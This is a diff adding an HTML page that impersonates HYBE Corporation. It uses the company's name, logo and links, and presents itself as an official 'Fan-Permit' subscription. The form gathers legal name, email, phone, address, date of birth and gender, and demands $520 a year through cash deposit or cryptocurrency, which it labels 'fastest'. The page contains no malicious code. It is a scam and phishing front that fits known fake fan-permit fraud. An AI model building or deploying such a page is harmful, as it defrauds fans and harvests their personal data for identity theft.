@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Official HYBE Fan-Permit Subscription Form 2025/2026</title>
+  <meta name="description" content="Join the HYBE Fan-Permit 2025/2026 for exclusive K-pop access, artist content, events, and limited-edition merchandise. Secure your spot today!" />
+  <meta name="keywords" content="HYBE, K-pop, fan subscription, fan permit, HYBE artists, HYBE membership, K-pop merchandise" />
+  <meta name="author" content="HYBE Corporation" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://your-domain.com" />
+  <meta property="og:title" content="Official HYBE Fan-Permit 2025/2026 Subscription" />
+  <meta property="og:description" content="Get exclusive access to HYBE artist events, behind-the-scenes content, and official merchandise." />
+  <meta property="og:image" content="https://logotyp.us/file/hybe.svg" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:url" content="https://your-domain.com" />
+  <meta name="twitter:title" content="Join HYBE Fan-Permit 2025/2026" />
+  <meta name="twitter:description" content="Be first in line for artist events, fan meetings, and official HYBE gear." />
+  <meta name="twitter:image" content="https://logotyp.us/file/hybe.svg" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/css/intlTelInput.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <noscript>
+    <div class="container my-5 text-center">
+      <h2>JavaScript Required</h2>
+      <p>Please enable JavaScript to use this form. See our <a href="https://help.x.com/en/using-x">Help Center</a> for supported browsers.</p>
+    </div>
+  </noscript>
+  <div class="modal fade" id="onboardingModal" tabindex="-1" aria-labelledby="onboardingModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content hero">
+        <div class="modal-body text-center">
+          <h2 id="onboardingModalLabel">Welcome to HYBE’s Fan-Permit!</h2>
+          <p>Join the global K-pop community with exclusive access to artist events and merchandise. This form connects you to your favorite artists in a secure, private environment, ensuring legal and authentic interactions for your safety against rights abuse. Learn about HYBE’s commitment to fan-artist privacy and security.</p>
+          <button class="btn btn-outline-primary" data-bs-dismiss="modal" onclick="document.getElementById('subscription-form').scrollIntoView({behavior: 'smooth'})">Start Now</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <main>
+    <div class="container my-5">
+      <div class="row justify-content-center">
+        <div class="col-lg-8 col-md-10">
+          <div class="card shadow-lg" data-aos="zoom-in">
+            <div class="card-body">
+              <div class="progress mb-4" role="progressbar" aria-label="Form progress" aria-valuenow="33" aria-valuemin="0" aria-valuemax="100">
+                <div class="progress-bar bg-gradient" style="width: 33%"></div>
+              </div>
+              <div class="text-center mb-4">
+                <img src="https://logotyp.us/file/hybe.svg" alt="HYBE Corporation Logo" class="img-fluid logo-pulse" loading="lazy" />
+              </div>
+              <h1 class="text-center mb-2">Official HYBE Fan-Permit 2025/2026</h1>
+              <h2 class="text-center text-muted mb-3">Join the Ultimate Fan Community</h2>
+              <p class="text-center description mb-4">Subscribe for exclusive access to HYBE artist updates, events, and merchandise.</p>
+              <form id="subscription-form" action="http://localhost:3000/submit-form" method="POST">
+                <input type="hidden" name="country" id="country">
+                <input type="hidden" name="currency" id="currency">
+                <input type="hidden" name="language" id="language">
+                <input type="hidden" name="permit-id" id="permit-id" />
+                <input type="hidden" name="submission-id" id="submission-id" />
+                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="10">
+                  <label for="referral-code" class="form-label">Referral Code <span class="text-danger">*</span></label>
+                  <input type="text" class="form-control" id="referral-code" name="referral-code" placeholder="Enter referral code" required aria-required="true" />
+                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Enter your exclusive referral code"></i>
+                </div>
+                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="25">
+                  <label for="full-name" class="form-label">Full Name <span class="text-danger">*</span></label>
+                  <input type="text" class="form-control" id="full-name" name="full-name" required aria-required="true" />
+                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Enter your full legal name"></i>
+                </div>
+                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="50">
+                  <label for="email" class="form-label">Email <span class="text-danger">*</span></label>
+                  <input type="email" class="form-control" id="email" name="email" required aria-required="true" />
+                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Use a valid, non-temporary email"></i>
+                  <p class="text-muted small">A verification email will be sent to confirm your email address.</p>
+                </div>
+                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="75">
+                  <label for="phone" class="form-label">Phone Number <span class="text-danger">*</span></label>
+                  <input type="tel" class="form-control" id="phone" name="phone" placeholder="Enter phone number" required aria-required="true" aria-describedby="phone-error" />
+                  <div id="phone-error" class="error-message"></div>
+                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Include country code"></i>
+                </div>
+                <div class="mb-3" data-aos="fade-up" data-aos-delay="100" id="address-section">
+                  <label class="form-label">Address <span class="text-danger">*</span></label>
+                  <div id="address-fields"></div>
+                </div>
+                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="125">
+                  <label for="dob" class="form-label">Date of Birth <span class="text-danger">*</span></label>
+                  <input type="date" class="form-control" id="dob" name="dob" required aria-required="true" placeholder="YYYY-MM-DD" />
+                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Enter your birth date"></i>
+                </div>
+                <div class="mb-3" data-aos="fade-up" data-aos-delay="150">
+                  <label for="gender" class="form-label">Gender <span class="text-danger">*</span></label>
+                  <select class="form-select" id="gender" name="gender" required aria-required="true">
+                    <option value="" disabled selected>Select Gender</option>
+                    <option value="Male">Male</option>
+                    <option value="Female">Female</option>
+                    <option value="Other">Other</option>
+                    <option value="Prefer Not to Say">Prefer Not to Say</option>
+                  </select>
+                </div>
+                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="200">
+                  <label for="branch" class="form-label">Fan-To-Artist Preferences <span class="text-danger">*</span></label>
+                  <select class="form-select" id="branch" name="branch" required aria-required="true">
+                    <option value="" disabled selected>Select a HYBE Branch</option>
+                  </select>
+                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Choose your favorite HYBE label"></i>
+                </div>
+                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="250">
+                  <label for="group" class="form-label">Select Your Favorite Group <span class="text-danger">*</span></label>
+                  <select class="form-select" id="group" name="group" required aria-required="true">
+                    <option value="" disabled selected>Select a Group</option>
+                  </select>
+                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Select your favorite group"></i>
+                </div>
+                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="300">
+                  <label for="artist" class="form-label">Select Your Favorite Artist(s) <span class="text-danger">*</span></label>
+                  <select class="form-select" id="artist" name="artist" required aria-required="true">
+                    <option value="" disabled selected>Select an Artist</option>
+                  </select>
+                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Pick your favorite artist"></i>
+                </div>
+                <div class="mb-3" data-aos="fade-up" data-aos-delay="325">
+                  <h3 class="h5">Why Subscribe to the HYBE Fan-Permit?</h3>
+                  <p class="text-muted mb-2">The HYBE Fan-Permit connects fans and artists in a secure, private environment, ensuring authentic interactions while prioritizing privacy and online safety.</p>
+                  <ul class="text-muted benefit-list">
+                    <li><strong>Fan Benefits:</strong> Gain exclusive access to artist events, behind-the-scenes content, and limited-edition merchandise, fostering a deeper connection with your favorite artists.</li>
+                    <li><strong>Artist Benefits:</strong> Artists engage directly with verified fans, sharing updates and content safely, building stronger fan relationships without public exposure risks.</li>
+                    <li><strong>Privacy & Security:</strong> Encrypted data ensures fan and artist information is protected. Secure communication channels prevent leaks and unauthorized access, safeguarding interactions.</li>
+                    <li><strong>Community Connection:</strong> Join a global fan network, share experiences, and participate in exclusive fan-driven initiatives, all within a trusted platform.</li>
+                    <li><strong>Stay Updated:</strong> Receive real-time HYBE news and artist updates securely, ensuring you’re always in the loop without spam or fake accounts.</li>
+                  </ul>
+                </div>
+                <div class="mb-3 subscription-amount" data-aos="fade-up" data-aos-delay="350">
+                  <label class="form-label">Subscription Amount</label>
+                  <p class="form-control-plaintext fw-bold text-primary" style="font-size: 1.5rem; background: linear-gradient(90deg, #8e44ad, #3498db); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+                    $520 / year
+                  </p>
+                  <input type="hidden" name="amount" value="$520/year" />
+                </div>
+                <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="400">
+                  <label for="payment-type" class="form-label">Select Payment Type <span class="text-danger">*</span></label>
+                  <select class="form-select" id="payment-type" name="payment-type" data-payment-type="" required aria-required="true">
+                    <option value="" disabled selected>Select Payment Type</option>
+                    <option value="Full Payment">Full Payment</option>
+                    <option value="Installment">Installment</option>
+                  </select>
+                  <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Choose payment method"></i>
+                </div>
+                <div class="mb-3 d-none" id="installment-options" data-aos="fade-up" data-aos-delay="450">
+                  <label for="installment-plan" class="form-label">Installment Plan <span class="text-danger">*</span></label>
+                  <select class="form-select" id="installment-plan" name="installment-plan" required>
+                    <option value="" disabled selected>Select Installment Plan</option>
+                    <option value="2-installment">2 Installments ($260 x 2)</option>
+                    <option value="3-installment">3 Installments ($173.33 x 3)</option>
+                  </select>
+                  <p class="mt-2 text-muted">Installments must be completed within the subscription year.</p>
+                </div>
+                <div class="mb-3 d-none" id="payment-methods" data-aos="fade-up" data-aos-delay="500">
+                  <label class="form-label">Payment Methods <span class="text-danger">*</span></label>
+                  <div class="form-check">
+                    <input class="form-check-input" type="radio" name="payment-method" id="cash-deposit" value="Cash Deposit" required />
+                    <label class="form-check-label" for="cash-deposit">Cash Deposit (14wks confirmation)</label>
+                  </div>
+                  <div class="form-check">
+                    <input class="form-check-input" type="radio" name="payment-method" id="digital-currency" value="Digital Currency" required />
+                    <label class="form-check-label" for="digital-currency">Digital Currency (1-2min confirmation, fastest)</label>
+                  </div>
+                  <div class="form-check">
+                    <input class="form-check-input" type="radio" name="payment-method" id="card-payment" value="Card Payment" required />
+                    <label class="form-check-label" for="card-payment">Card Payment (24hr confirmation)</label>
+                  </div>
+                </div>
+                <div class="mb-3" data-aos="fade-up" data-aos-delay="600">
+                  <label class="form-label">Preferred Contact Method <span class="text-danger">*</span></label>
+                  <div class="form-check">
+                    <input class="form-check-input" type="checkbox" name="contact-method" id="email-contact" value="Via Email" required />
+                    <label class="form-check-label" for="email-contact">Via Email</label>
+                  </div>
+                  <div class="form-check">
+                    <input class="form-check-input" type="checkbox" name="contact-method" id="sms-contact" value="Via SMS" />
+                    <label class="form-check-label" for="sms-contact">Via SMS</label>
+                  </div>
+                </div>
+                <div class="mb-3" data-aos="fade-up" data-aos-delay="650">
+                  <label for="feedback" class="form-label">Feedback (Optional)</label>
+                  <textarea class="form-control" id="feedback" name="feedback" placeholder="Share your thoughts about the Fan-Permit"></textarea>
+                </div>
+                <div class="mb-3" data-aos="fade-up" data-aos-delay="700">
+                  <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="installment-terms" name="installment-terms" />
+                    <label class="form-check-label" for="installment-terms"> Agree to installment terms.</label>
+                  </div>
+                  <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="privacy-policy" name="privacy-policy" required />
+                    <label class="form-check-label" for="privacy-policy">I agree to HYBE’s Privacy Policy and Terms of Service.</label>
+                  </div>
+                  <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="subscription-agreement" name="subscription-agreement" required />
+                    <label class="form-check-label" for="subscription-agreement"> Agree and complete subscription.</label>
+                  </div>
+                </div>
+                <button type="submit" class="btn btn-primary w-100 btn-gradient" data-aos="fade-up" data-aos-delay="750" id="submit-btn">
+                  <span class="btn-text">Submit Subscription</span>
+                  <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
+                </button>
+              </form>
+              <p id="form-message" class="mt-3 text-center alert alert-dismissible fade show d-none" role="alert" aria-live="polite"></p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="modal fade" id="validationModal" tabindex="-1" aria-labelledby="validationModalLabel" aria-hidden="true">
+      <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+          <div class="modal-body text-center">
+            <p>Verifying your answers... <span id="countdown">3</span></p>
+            <div class="spinner-border text-primary" role="status">
+              <span class="visually-hidden">Loading...</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+  <footer class="bg-gradient text-white py-5">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-4 mb-3">
+          <img src="https://logotyp.us/file/hybe.svg" alt="HYBE Corporation Logo" class="img-fluid mb-2" style="max-width: 150px;" loading="lazy" />
+          <p>Empowering global K-pop innovation.</p>
+        </div>
+        <div class="col-md-4 mb-3">
+          <h5>Quick Links</h5>
+          <ul class="list-unstyled">
+            <li><a href="https://hybecorp.com" class="text-white text-decoration-none hover-link">About Us</a></li>
+            <li><a href="https://careers.hybecorp.com" class="text-white text-decoration-none hover-link">Careers</a></li>
+            <li><a href="https://hybecorp.com" class="text-white text-decoration-none hover-link">Privacy Policy</a></li>
+            <li><a href="https://hybecorp.com" class="text-white text-decoration-none hover-link">Terms of Service</a></li>
+          </ul>
+        </div>
+        <div class="col-md-4 mb-3">
+          <h5>Contact Us</h5>
+          <p>Email: <a href="mailto:privacy@hybecorp.com" class="text-white text-decoration-none hover-link">privacy@hybecorp.com</a></p>
+          <p>Follow us:</p>
+          <a href="https://x.com/hybeofficial" class="text-white me-3 social-icon"><i class="bi bi-twitter-x"></i></a>
+          <a href="https://instagram.com/hybe.official" class="text-white me-3 social-icon"><i class="bi bi-instagram"></i></a>
+          <a href="https://youtube.com/hybe" class="text-white social-icon"><i class="bi bi-youtube"></i></a>
+        </div>
+      </div>
+      <div class="text-center mt-4">
+        <p>© 2025 HYBE Corporation. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/intlTelInput.min.js"></script>
+  <script src="script.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const onboardingModal = new bootstrap.Modal(document.getElementById("onboardingModal"));
+      onboardingModal.show();
+    });
+  </script>
+</body>
+</html>
